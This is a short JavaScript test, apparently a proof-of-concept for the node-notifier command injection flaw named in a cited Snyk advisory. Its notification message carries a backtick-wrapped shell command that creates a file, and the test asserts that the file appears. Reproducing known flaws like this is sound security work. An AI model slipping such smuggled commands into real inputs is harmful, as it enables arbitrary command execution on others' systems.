// https://snyk.io/vuln/SNYK-JS-NODENOTIFIER-1035794
test("Command Injection in node-notifier", () => {
  expect.assertions(2);
  const Notify = require("node-notifier").NotifySend;
  let notifier = new Notify({ suppressOsdCheck: true });
  let options = JSON.parse(
    '{"title":"Foo", "message":["`touch node-notifier & echo 23`"]}'
  );
  const fs = require("fs");
  const path = "./node-notifier";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  notifier.notify(options);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
